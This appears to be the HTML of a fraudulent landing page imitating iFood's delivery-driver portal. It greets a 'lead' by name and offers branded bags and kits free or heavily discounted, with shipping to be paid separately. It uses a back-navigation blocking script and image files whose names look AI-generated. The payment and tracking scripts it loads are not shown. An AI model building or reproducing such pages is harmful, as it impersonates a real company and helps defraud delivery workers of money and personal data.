<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#EA1D2C">
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <title>iFood Entregador - Escolha seu item</title>
    <meta name="description" content="Escolha um item e confira os valores antes de continuar.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css?v=3.2">
    <link rel="stylesheet" href="sucesso.css?v=2">
    <script src="/backguard.js?v=1.5"></script>
</head>

<body data-page="success">

    <header class="header">
        <div class="logo-container">
            <img src="assets/ifoodentregadores-wink-v1.svg" alt="iFood Entregador" class="ifood-logo ifood-logo--wide">
        </div>
    </header>

    <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>

    <main class="container">
        <section class="step" aria-hidden="false">
            <div class="step-header">
                <span class="step-count">Escolha do item</span>
                <div class="progress-bar" role="progressbar" aria-label="Etapas conclu&iacute;das" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100">
                    <div class="progress" style="width: 90%"></div>
                </div>
            </div>

            <h1>Tudo pronto, <span id="lead-name">parceiro</span>!</h1>
            <p class="success-intro">Escolha uma op&ccedil;&atilde;o para continuar. Voc&ecirc; poder&aacute; conferir o frete e o total antes do pagamento.</p>

            <div class="product-card success-offer-card">
                <div class="success-offer-grid" aria-label="Itens dispon&iacute;veis">
                    <button class="success-reward-card" type="button" data-reward-id="bag" aria-pressed="false">
                        <span class="success-reward-media">
                            <img src="assets/bagfoto.webp" alt="Bag do iFood" class="success-reward-image" loading="lazy" decoding="async">
                        </span>
                        <span class="success-reward-copy">
                            <span class="success-reward-title">Bag do iFood</span>
                            <span class="price-row">
                                <span class="old-price">De <s>R$ 149,90</s></span>
                                <span class="new-price">R$ 0,00</span>
                            </span>
                        </span>
                        <span class="success-reward-radio" aria-hidden="true"></span>
                    </button>

                    <button class="success-reward-card" type="button" data-reward-id="bau" aria-pressed="false">
                        <span class="success-reward-media">
                            <img src="assets/__task____isolate_ifood_delivery_box_white_background_,_202603260112 (1).webp" alt="Ba&uacute; do iFood" class="success-reward-image" loading="lazy" decoding="async">
                        </span>
                        <span class="success-reward-copy">
                            <span class="success-reward-title">Ba&uacute; do iFood</span>
                            <span class="price-row">
                                <span class="old-price">De <s>R$ 249,90</s></span>
                                <span class="new-price">R$ 39,90</span>
                            </span>
                        </span>
                        <span class="success-reward-radio" aria-hidden="true"></span>
                    </button>

                    <button class="success-reward-card" type="button" data-reward-id="kit_entregador" aria-pressed="false">
                        <span class="success-reward-media">
                            <img src="assets/__task____fix_ifood_logo_on_jacket_,_202603260102 (1).webp" alt="Kit Entregador iFood" class="success-reward-image" loading="lazy" decoding="async">
                        </span>
                        <span class="success-reward-copy">
                            <span class="success-reward-title">Kit Entregador iFood</span>
                            <span class="price-row">
                                <span class="old-price">De <s>R$ 449,90</s></span>
                                <span class="new-price">R$ 97,90</span>
                            </span>
                        </span>
                        <span class="success-reward-radio" aria-hidden="true"></span>
                    </button>
                </div>
            </div>

            <div class="action-stack">
                <button id="btn-checkout" class="btn-primary" type="button" disabled>Continuar</button>
            </div>

            <p class="shipping-note">O frete n&atilde;o est&aacute; inclu&iacute;do nos valores acima. Voc&ecirc; ver&aacute; o total antes de confirmar o pagamento.</p>
        </section>
    </main>

    <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>

    <footer class="footer">
        <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
    </footer>

    <script src="script.js?v=10.9" defer></script>
</body>

</html>
